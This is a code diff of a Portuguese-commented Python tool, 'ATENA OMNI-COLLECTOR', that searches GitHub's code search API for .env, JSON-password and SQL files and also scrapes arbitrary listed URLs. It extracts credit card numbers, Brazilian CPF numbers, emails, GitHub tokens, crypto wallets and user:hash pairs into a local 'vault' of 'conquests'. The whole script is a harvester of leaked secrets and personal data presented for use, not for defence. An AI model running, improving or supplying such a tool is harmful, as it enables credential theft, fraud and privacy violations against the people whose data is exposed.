@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-ATENA: OMNI-SOVEREIGN v8.0
-Evolução: Descoberta de Alvos via Domínio e Varredura Global.
+ATENA: OMNI-SOVEREIGN v9.0
+Evolução: Extração Universal de Dados (Cartões, CPFs, Emails e Tokens).
 Copyright (c) 2026 Danilo Gomes.
 """
 import json
 import re
-import time
+import base64
 from datetime import datetime
 from pathlib import Path
 import subprocess
@@ -24,76 +24,71 @@ BASE_DIR = Path(__file__).resolve().parent
 ARQUIVO_ALVOS = BASE_DIR / "alvos.txt"
 VAULT = BASE_DIR / "atena_vault.json"
 
-class AtenaDomainPredator:
+class AtenaCollector:
     def __init__(self):
         self._init_vault()
-        self.headers = {
-            'User-Agent': 'Mozilla/5.0',
-            'Accept': 'application/vnd.github.v3+json'
-        }
+        self.headers = {'User-Agent': 'Mozilla/5.0'}
 
     def _init_vault(self):
         if not VAULT.exists():
             with open(VAULT, "w", encoding="utf-8") as f:
                 json.dump([], f)
 
-    def save_conquest(self, secret, category, source):
+    def save_conquest(self, data, category, source):
         with open(VAULT, "r", encoding="utf-8") as f:
             vault = json.load(f)
-        if any(e['secret'] == secret for e in vault): return
+        
+        # Evita duplicatas para não encher o Vault de lixo
+        if any(e['data_bruta'] == data for e in vault): return
         
         entry = {
             "timestamp": datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
-            "secret": secret,
+            "data_bruta": data,
             "categoria": category,
             "origem": source,
-            "author": "Danilo Gomes"
+            "proprietario": "Danilo Gomes"
         }
         vault.append(entry)
         with open(VAULT, "w", encoding="utf-8") as f:
             json.dump(vault, f, indent=4, ensure_ascii=False)
-        print(f"🔓 [CONQUISTADO] {category} capturado de {source}")
+        print(f"🔥 [COLETADO] {category} -> {source}")
 
-    def scour_github_global(self):
-        """Busca por repositórios públicos recentes que possam conter vazamentos."""
-        print("🧬 ATENA iniciando varredura global no GitHub por rastros expostos...")
-        # Busca por termos sensíveis em arquivos recentes via API de busca do GitHub
-        search_url = "https://api.github.com/search/code?q=extension:env+ghp_+language:python"
-        try:
-            r = requests.get(search_url, headers=self.headers, timeout=15)
-            if r.status_code == 200:
-                items = r.json().get('items', [])
-                for item in items:
-                    print(f"🎯 Alvo detectado: {item['repository']['full_name']}")
-                    self.deep_scan_file(item['git_url'].replace('/git/blobs/', '/contents/'), item['html_url'])
-        except:
-            print("⚠️ Limite de busca global atingido. Aguardando metabolismo...")
+    def metabolize(self, text, source):
+        """O cérebro da ATENA: identifica padrões de valor no rastro digital."""
+        patterns = {
+            "Cartao_Credito": r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12})\b',
+            "CPF": r'\b\[0-9]{3}\.[0-9]{3}\.[0-9]{3}\-[0-9]{2}\b|\b[0-9]{11}\b',
+            "Email_Login": r'[\w\.-]+@[\w\.-]+\.\w+',
+            "GH_Token": r'ghp_[a-zA-Z0-9]{36}',
+            "Crypto_Wallet": r'\b(0x[a-fA-F0-9]{40}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b',
+            "Combo_User_Pass": r'([a-zA-Z0-9._%+-]+:[a-fA-F0-9]{32,64})'
+        }
 
-    def deep_scan_file(self, content_api_url, html_url):
-        """Analisa o conteúdo bruto de arquivos encontrados na varredura."""
-        try:
-            r = requests.get(content_api_url, headers=self.headers, timeout=10)
-            if r.status_code == 200:
-                # O GitHub retorna conteúdo em Base64 na API de contents
-                import base64
-                content = base64.b64decode(r.json()['content']).decode('utf-8')
-                
-                patterns = {
-                    "GitHub_Token": r'(ghp_[a-zA-Z0-9]{36})',
-                    "API_Key": r'(?:key|api|token|secret|pass|pwd)[=:][\s"\']?([a-zA-Z0-9-_{}]{16,})',
-                    "Bearer_Token": r'Bearer\s([a-zA-Z0-9\-\._~\+\/]+=*)'
-                }
+        for cat, reg in patterns.items():
+            matches = re.findall(reg, text)
+            for m in matches:
+                self.save_conquest(m, cat, source)
 
-                for cat, reg in patterns.items():
-                    matches = re.findall(reg, content, re.IGNORECASE)
-                    for m in matches:
-                        secret = m[1] if isinstance(m, tuple) else m
-                        self.save_conquest(secret.strip(), cat, html_url)
-        except: pass
+    def hunt_github(self):
+        """Busca global no GitHub por vazamentos em tempo real."""
+        print("🧬 ATENA rastreando a malha global do GitHub por novos vazamentos...")
+        search_queries = ["extension:env", "extension:json \"password\"", "extension:sql"]
+        for query in search_queries:
+            api_url = f"https://api.github.com/search/code?q={query}"
+            try:
+                r = requests.get(api_url, headers=self.headers, timeout=10)
+                if r.status_code == 200:
+                    for item in r.json().get('items', []):
+                        # Pega o conteúdo bruto do arquivo via API de blobs
+                        file_res = requests.get(item['url'], headers=self.headers)
+                        if file_res.status_code == 200:
+                            raw_content = base64.b64decode(file_res.json()['content']).decode('utf-8', errors='ignore')
+                            self.metabolize(raw_content, item['html_url'])
+            except: pass
 
 def main():
-    atena = AtenaDomainPredator()
-    print(f"🧬 ATENA v8.0: DOMAIN PREDATOR")
+    atena = AtenaCollector()
+    print(f"🧬 ATENA v9.0: OMNI-COLLECTOR")
     print(f"👤 Soberano: Danilo Gomes")
     print("-" * 55)
 
@@ -103,15 +98,17 @@ def main():
         alvos = [l.strip() for l in f if l.strip()]
 
     for alvo in alvos:
-        if "github.com" in alvo and len(alvo) < 25: # Link genérico detectado
-            atena.scour_github_global()
-        elif "github.com" in alvo: # Link de repositório específico
-            # Chama a lógica recursiva da v7.0
-            print(f"🛰️ Focando em repositório específico: {alvo}")
-            # (Adicionar aqui a chamada da v7.0 para alvo específico)
+        if "github.com" in alvo:
+            atena.hunt_github()
+        elif alvo.startswith("http"):
+            try:
+                res = requests.get(alvo, timeout=10)
+                atena.metabolize(res.text, alvo)
+            except: pass
 
     print("-" * 55)
-    print(f"📊 Varredura concluída. Verifique o atena_vault.json")
+    print(f"📊 Colheita finalizada. Dados salvos no Vault.")
 
 if __name__ == "__main__":
     main()
+    
